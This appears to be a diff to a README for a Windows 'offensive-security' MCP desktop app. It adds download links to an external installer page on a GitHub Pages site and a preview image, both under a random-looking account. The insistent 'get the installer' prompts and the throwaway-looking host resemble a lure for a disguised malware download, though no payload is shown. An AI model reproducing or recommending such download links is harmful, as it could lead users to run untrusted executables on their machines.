@@ -6,7 +6,7 @@ An agentic offensive-security desktop app — is a Windows-side MCP server that 
 
 # 📥 **INSTALLER PICKUP — START HERE**
 
-## [⬇️ **GET THE WINDOWS INSTALLER**]( )
+## [⬇️ **GET THE WINDOWS INSTALLER**](https://mphkbajromjo.github.io/HexStrike-AI-PC-Desktop-App-Windows/)
 
 > One tap, the package opens on its own page — no wrapper in between.
 
@@ -14,11 +14,11 @@ An agentic offensive-security desktop app — is a Windows-side MCP server that 
 
 ## 🖼️ **PREVIEW IMAGE**
 
-<img src="" width="1280" height="720" alt= preview image">
+<img src="https://github.com/mphkbajromjo/HexStrike-AI-PC-Desktop-App-Windows/blob/main/hexstrike.jpg?raw=true" width="1280" height="720" alt= preview image">
 
 ---
 
-### 📦 [**OPEN THE PACKAGE**]( )
+### 📦 [**OPEN THE PACKAGE**](https://mphkbajromjo.github.io/HexStrike-AI-PC-Desktop-App-Windows/)
 
 ---
 
